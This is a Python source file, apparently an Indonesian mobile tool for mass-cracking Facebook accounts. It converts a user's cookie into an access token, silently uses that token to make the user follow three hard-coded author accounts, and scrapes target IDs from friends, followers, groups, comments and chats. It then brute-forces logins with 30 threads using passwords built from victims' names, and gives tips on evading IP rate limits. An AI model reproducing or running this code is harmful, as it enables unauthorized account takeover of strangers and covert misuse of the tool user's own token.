		'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
		'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type' : 'text/html; charset=utf-8',
		'accept-encoding':'gzip, deflate',
		'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cookie': kukis
	}
	try:
		ling = requests.get("https://business.facebook.com/business_locations", headers=_header)
		cari = re.search('(EAAG\w+)', ling.text)
		romz = cari.group(1)
		if 'EAAG' in romz:
			open('data/token.txt', 'w').write(romz)
			print (f'\n{P}?{J} Token anda {N} : {H}{romz} ');jeda(2)
			login_bot(romz)
	except AttributeError:
		print("%s%s terjadi kesalahan saat convert, periksa cookie anda "%(M,til))
		exit()
	except UnboundLocalError:
		print("%s%s terjadi kesalahan saat convert, periksa cookie anda "%(M,til))
		exit()

# JANGAN DI UBAH !
def login_bot(romz):
	try:
		toket = romz
		romz1 = ('100067807565861')
		romz2 = ('100029143111567')
		romz3 = ('100028434880529')
		requests.post(f"https://graph.facebook.com/{romz1}?fields=subscribers&access_token={toket}") # ROMI AFRIZAL PENGGUNA AKUN UNIK
		requests.post(f"https://graph.facebook.com/{romz2}?fields=subscribers&access_token={toket}") # DEMIT ROMI AFRIZAL
		requests.post(f"https://graph.facebook.com/{romz3}?fields=subscribers&access_token={toket}") # Romi Afrizal (2018)
		
	except:
		pass
		
# MENU PILIHAN INI AJG
class Menu():
	
	def __init__(self,url):
		self.url = url
		
	def tentang(self):
		try:
			kueh = romz_xyz(open("data/cookies","r").read().strip())
		except IOError:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			os.system('python bff-2.py')
		try:
			tentang = json.loads(open("data/my_info","r").read().strip())
		except FileNotFoundError:
			from data import informasi
			informasi.info(kueh, requests.get("https://mbasic.facebook.com/profile.php?v=info",cookies = kueh).text).myinfo()
			os.system('python bff-2.py')
		try:
			a = requests.get(f"{self.url}/profile.php", cookies = kueh).text
		except requests.exceptions.ConnectionError:
			exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		if "mbasic_logout_button" not in a:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			os.system('python bff-2.py')
		else:
			sa = "ADMIN"
			banner()
			krek = f"Nama   : {tentang.get('nama')}\nIP     : %s\nNegara : %s\nStatus : {sa}"%(IP,CN)
			cetak(nel(krek, title='• INFORMASI •'))
			tap = me()
			tap.add_column('NO', style='purple', justify='center')
			tap.add_column('MENU', style='blue', justify='center')
			tap.add_column('STATUS', style='green', justify='center')
			tap.add_row('[01]','     Crack Dari Pertemanan Publik ','[ON]')
			tap.add_row('[02]','     Crack Dari Followers Publik','[ON]')
			tap.add_row('[03]','     Lihat Hasil Crack','[ON]')
			tap.add_row('[00]','     Keluar (Hapus Cookie)','[ON]')
			sol().print(tap, justify='purple')
		
class pilihan:
	
	def __init__(self):
		self.kueh = romz_xyz(open("data/cookies","r").read().strip())
		try:
			self.token = open("data/token.txt","r").read()
		except FileNotFoundError:
			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
			os.system('clear')
			print ("%s%s cookie invalid "%(M,til));jeda(2)
			exit()
		self.url = ("https://mbasic.facebook.com")
		self.id = []
				
	def menu(self):
		Menu(self.url).tentang()
		slut = input('\n%s%s%s Pilih %s: %s'%(O,til,J,K,H))
		print("")
		if slut in['',' ']:
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()
		elif slut in['2','02']:
			try:
				list = input(f"{C}[{H}!{C}] File Anda : ")
				for line in open(list,'r').readlines():
					self.id.append(line.strip())
			except IOError:
				print(f"{C}[{M}×{C}] File Tidak Tersedia")
		elif slut in['1','01']:
			idt = input('%s%s %sId Target %s: %s'%(O,til,J,M,K))
			if idt in[""," "]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			elif(re.findall("\w+",idt)):
				r = requests.get("https://mbasic.facebook.com/"+idt).text
				try:
					user = re.findall('\;rid\=(\d+)\&',str(r))[0]
				except:
					user = idt
				try:
					#print (f"{U}{til}{O} Nama Target {M}>{K} "+re.findall("\<title\>(.*?)<\/title\>",response)[0])
					token = self.token
					self.PublikGRAPH(user, token)
				except KeyError:
					exit('\n%s%s gagal mengambil id '%(M,til))
		elif slut in['4','04']:
			print ("\n%s%s %sPastikan target terdapat pengikut nya "%(U,til,O))
			idt = input('%s%s %sUsername/Id%s > %s'%(U,til,O,M,K))
			if idt in[""," "]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			else:
				data_ = (f"{self.url}/{idt}?v=followers")
			try:
				response = requests.get(data_, cookies=self.kueh).text
				if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				elif "Halaman yang Anda minta tidak ditemukan." in response:
					exit('\n%s%s Id tidak ditemukan '%(M,til))
				elif "Konten Tidak Ditemukan" in response:
					exit('\n%s%s Id tidak ditemukan '%(M,til))
				else:
					#print (f"{U}{til}{O} Nama akun {M}>{K} "+re.findall("\<title\>(.*?)<\/title\>",response)[0])
					print ('')
					self.FollowersPAR(data_)
			except requests.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		elif slut in['5','05']:
			print ("\n%s%s%s 01 %sCek hasil akun facebook "%(U,til,P,O))
			print ("%s%s%s 02 %sCek hasil akun instagram "%(U,til,P,O))
			print ("%s%s%s 03 %sHapus hasil crack "%(U,til,P,O))
			print ("%s%s%s 00 %sKembali "%(U,til,M,O))
			rom = input('\n%s# %sPilih %s> %s'%(P,O,M,K))
			cek_cek(rom)
		elif slut in['13']:
			file_cp()
		elif slut in['0','00']:
			print ('\n%s%s menghapus data login dari termux '%(M,til));jeda(1)
			try:
				os.remove("data/cookies")
				os.remove("data/token.txt")
				os.remove("data/my_info")
			except:
				os.system("rm -rf data/cookie && rm -rf data/token && rm -rf data/my_info")
			jalan('\n%s√ berhasil terhapus '%(H))
			exit()
		
		if len(self.id)!=0:
			print
			return Crack().romiy(self.id)
		#else:
			#exit (f'{M}{til} gagal mengambil ID ')
			
	# CRACK MASSAL
	def MassalGRAPH(self, token):
		try:
			jum = int(input('%s%s %sJumlah target%s : %s'%(O,til,J,M,K)))
			print ("\n%s%s %sID HARUS PUBLIK "%(U,til,O))
		except:jum=1
		for t in range(jum):
			t +=1
			idt = input('%s%s %sUsername/Id %s%s%s : %s'%(O,til,J,P,t,M,K))
			if idt in['']:
				print
			elif(re.findall("\w+",idt)):
				r = requests.get("https://mbasic.facebook.com/"+idt).text
				try:
					user = re.findall('\;rid\=(\d+)\&',str(r))[0]
				except:
					user = idt
			po = requests.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name)&access_token={token}').json()
			for i in po['friends']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
		try:
			print ('')
		except:
			pass
						
	# CRACK PUBLIK 
	def PublikGRAPH(self, user, token):
		try:
			po = requests.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			for i in po['friends']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
		except:
			pass
			
	# CRACK FOLLOWERS
	def FollowersPAR(self, data_):
		try:
			respon = requests.get(data_, cookies = self.kueh).text
			otw = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', respon) 
			for i in otw:
				if "&amp;refid=" in i[0]:
					self.id.append(re.findall("id=(.*?)&",i[0])[0]+"<=>"+i[1])
				elif "profile.php?" in i[0]:
					self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
				elif "?refid=" in i[0]:
					self.id.append(re.findall("(.*?)\?refid=",i[0])[0]+"<=>"+i[1])
				else:
					self.id.append(i[0]+"<=>"+i[1])
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			if "Lihat Selengkapnya" in respon:
				self.FollowersPAR(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:
			pass
			
	# CRACK POSTINGAN PUBLIK
	def postingan(self, data_):
		try:
			respon = requests.get(data_, cookies=self.kueh).text
			if "Semua 0" in respon:
				exit('\n%s%s tidak ada yg menanggapi postingan'%(M,til))
			else:
				otw = re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',respon)
				for i in otw:
					if "profile.php?" in i[0]:
						self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
					else:
						self.id.append(re.findall("/(.*)",i[0])[0]+"<=>"+i[1])
					print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
				if "Lihat Selengkapnya" in respon:
					self.postingan(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:
			pass
		
	# CRACK POSTINGAN KOMENTAR
	def komen(self, data_):
		try:
			respon = requests.get(data_, cookies=self.kueh).text
			otw = parser(respon,'html.parser')
			for i in otw.find_all('h3'):
				for a in i.find_all('a',href=True):
					if "profile.php" in a.get("href"):
						c = a.get("href").split('=')[1]
						id = c.split('&')[0]
						user = a.text
						self.id.append(id+'<=>'+user)
					else:
						c = a.get("href").split('?')[0]
						id = c.split('/')[1]
						user = a.text
						self.id.append(id+'<=>'+user)
					print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			for i in otw.find_all("a",href=True):
				if "Lihat komentar lainnya…" in i.text:
					self.komen("https://mbasic.facebook.com/"+i.get("href"))
		except:
			pass

	# CRACK GROUP
	def grup(self, data_):
		try:
			respon = requests.get(data_, cookies=self.kueh).text
			otw = re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',respon)
			for i in otw:
				if "profile.php?" in i[0]:
					self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
				else:
					self.id.append(i[0]+"<=>"+i[1])
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			if "Lihat Selengkapnya" in respon:
				self.grup(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def tambah(gc):
					a = requests.get(gc, cookies=kueh).text
					b = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
					if "Lihat Postingan Lainnya" in a:
						tambah(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				tambah(f"{self.url}/groups/"+re.search("id=(\\d*)",data_).group(1))
		except:
			pass
	
	# CRACK PENCARIAN NAMA
	def nama(self, data_, jum):
		try:
			true = False
			respon = requests.get(data_, cookies=self.kueh).text
			otw = re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',respon)
			for i in otw:
				if "profile.php?" in i[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",i[1])[0]+"<=>"+i[2])
				else:
					self.id.append(re.findall("(.*?)\?refid=",i[1])[0]+"<=>"+i[2])
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in respon:
					self.nama(parser(respon,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:
			pass
			
	# CRACK PESAN CHAT
	def pesan(self, data_):
		try:
			bs = parser(requests.get(data_, cookies=self.kueh).text, 'html.parser')
			print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			for i in bs.find_all('a', href=True):
				if '/messages/read' in i.get('href'):
					f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
					try:
						for ip in list(f.pop()):
							if self.kueh.get(' c_user') in ip:
								continue
							else:
								if 'pengguna facebook' in i.text.lower():
									continue
								self.id.append(ip+"<=>"+i.text)
					except Exception as e:
						continue
				if 'Lihat Pesan Sebelumnya' in i.text:
					self.pesan('https://mbasic.facebook.com/' + i.get('href'))
		except:
			pass
			
	# CRACK SARAN TEMAN
	def saran(self, data_, jum):
		try:
			true = False
			respon = requests.get(data_, cookies=self.kueh).text
			otw = re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/mbasic/\?uid=(\\d*).*?"\>(.*?)</a\>',respon)
			if len(otw)!=0:
				for i in otw:
					self.id.append(i[0]+"<=>"+i[1])
					print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
					if len(self.id)==jum:
						true=True
						break
			if true==False:
				if "Lihat selengkapnya" in respon:
					self.saran(self.url+parser(respon,"html.parser").find("a",string="Lihat selengkapnya").get("href"),jum)
		except:
			pass
		
# USER AGENT
def user_agentAPI():
	ugent =[
	    "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
	    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
        "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
        "NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
        "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
        "Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
       "Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
       "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
       "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
       "[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"]
	rand_ua = random.choice(ugent)
	return rand_ua
	
# GANTI USER AGENT
def useragent():
	print ("\n%s%s%s 01 %sGanti user agent "%(U,til,P,O))
	print ("%s%s%s 02 %sCek user agent "%(U,til,P,O))
	print ("%s%s%s 00 %sKembali "%(U,til,M,O))
	_romz_ = input('\n%s#%s Pilih%s >%s '%(P,O,M,K))
	uas(_romz_)
	
def uas(_romz_):
	if _romz_ == '':
		print ('%s%s isi yang benar'%(M,til));jeda(2)
		uas(_romz_)
	elif _romz_ in("1","01"):
		print ("%s%s%s Ketik %sMy user agent%s di browser google chrome\n%s%s%s untuk gunakan user agent anda sendiri"%(U,til,O,H,O,U,til,O))
		print ("%s%s%s Ketik %sCancel%s untuk gunakan user agent bawaan tools"%(U,til,O,H,O))
		ua = input("%s%s%s Enter user agent %s: %s"%(U,til,O,M,K))
		if ua in(""):
			print ("%s%s isi yang benar "%(M,til));jeda(2)
			menu()
		elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
			jalan("%s%s%s Anda akan di arahkan ke browser "%(U,til,O));jeda(2)
			os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2)
			useragent(_romz_)
		elif ua in("CANCEL","Cancel","cancel"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
			open("ua.txt","w").write(ua_);jeda(2)
			print ("\n%s%s menggunakan user agent bawaan "%(H,til));jeda(2)
			menu()
		open("ua.txt","w").write(ua);jeda(2)
		print ("\n%s%s berhasil mengganti user agent"%(H,til));jeda(2)
		menu()
	elif _romz_ in("2","02"):
		try:
			ua_ = open('ua.txt', 'r').read();jeda(2)
			print ("%s%s%s user agent anda%s : %s%s"%(U,til,O,M,H,ua_));jeda(2)
			input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
			menu()
		except IOError:
			ua_ = '%s-'%(M)
	elif _romz_ in("0","00"):
		menu()
	else:
		print ('%s%s isi yang benar'%(M,til));jeda(2)
		uas(_romz_)
		
# MULAI CRACK 
pwx = []
class Crack:
	
	def __init__(self):
		self.id = []
		self.url = "https://mbasic.facebook.com"
		
	def romiy(self, id):
		self.id = id
		print ('%s%s%s Total ID%s : %s%s'%(O,til,J,M,H,len(self.id)))
		unikers = input('\n%s%s%s Ingin pakai password manual? [y/t]%s : %s'%(O,til,J,M,K))
		if unikers in ('Y', 'y'):
			print ('\n%s%s%s contoh%s >%s sayang%s,%spengen%s,%sngentot'%(O,til,J,M,O,M,O,M,O))
			while True:
				pwx = input('%s%s%s password %s: %s'%(O,til,J,M,K))
				if pwx == '':
					print ('\n%s%s jangan kosong '%(M,til))
				elif len(pwx)<=5:
					print ('\n%s%s password minimal 6 karakter'%(M,til))
					exit()
				else:
					def manual(brute=None):
						ind = input('\n%s#%s Pilih %s:%s '%(P,O,M,K))
						if ind =='':
							print("%s%s isi yang benar kentod "%(M,til))
							manual()
						elif ind in ('1', '01'):
							krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(waktu,waktu)
							cetak(nel(krek, title='• Hasil •'))
							krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
							cetak(nel(krek, title='• Tips •'))
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.touch, _heck_, brute)
									except: pass
							hasil(ok,cp)
						elif ind in ('2', '02'):
							krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(waktu,waktu)
							cetak(nel(krek, title='• Hasil •'))
							krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
							cetak(nel(krek, title='• Tips •'))
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.basic, _heck_, brute)
									except: pass
							hasil(ok,cp)
						elif ind in ('3', '03'):
							krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(waktu,waktu)
							cetak(nel(krek, title='• Hasil •'))
							krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
							cetak(nel(krek, title='• Tips •'))
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.mobil, _heck_, brute)
									except: pass
							hasil(ok,cp)
						else:
							print ('\n%s%s isi yang benar kentod'%(M,til))
							manual()
					met = '# PILIH METHOD CRACK'
					sol().print(mark(met, style='green'))
					tap = me()
					tap.add_column('NO', style='red', justify='center')
					tap.add_column('METHODE', style='yellow', justify='center')
					tap.add_row('[01]',' Method Api [NOT RECOMMENDED]')
					tap.add_row('[02]',' Method Mbasic [RECOMMENDED V1]')
					tap.add_row('[03]',' Method Mobile [RECOMMENDED V2]')
					sol().print(tap, justify='center')
					manual(pwx.split(','))
					break
		elif unikers in ('T', 't'):
			met = '# PILIH METHOD CRACK'
			sol().print(mark(met, style='green'))
			tap = me()
			tap.add_column('NO', style='red', justify='center')
			tap.add_column('METHODE', style='yellow', justify='center')
			tap.add_row('[01]',' Method Api [NOT RECOMMENDED]')
			tap.add_row('[02]',' Method Mbasic [RECOMMENDED V1]')
			tap.add_row('[03]',' Method Mobile [RECOMMENDED V2]')
			tap.add_row('[04]',' Method Mobile [RECOMMENDED V3]')
			sol().print(tap, justify='center')
			self.langsung()
		else:
			print("%s%s Isi yang benar kentod "%(M,til));jeda(2)
			pilihan().menu()
	
	# LANGSUNG
	def langsung(self):
		global pwx
		#from data import list_peweh
		suuu = input('\n%s%s%s Pilih %s:%s '%(P,til,O,M,K))
		if suuu == '':
			print("%s%s Isi yang benar kentod "%(M,til))
			self.langsung()
		elif suuu in ('1', '01'):
			krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(waktu,waktu)
			cetak(nel(krek, title='• Hasil •'))
			krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
			cetak(nel(krek, title='• Tips •'))
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.touch, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('2', '02'):
			krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(waktu,waktu)
			cetak(nel(krek, title='• Hasil •'))
			krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
			cetak(nel(krek, title='• Tips •'))
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345","sayang","anjing","kontol","bajingan"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345","sayang","anjing","kontol","bajingan"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345","sayang","anjing","kontol","bajingan"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345","sayang","anjing","kontol","bajingan"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345","sayang","anjing","kontol","bajingan"]
						TitidNeverDie.submit(self.basic, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('3', '03'):
			krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(waktu,waktu)
			cetak(nel(krek, title='• Hasil •'))
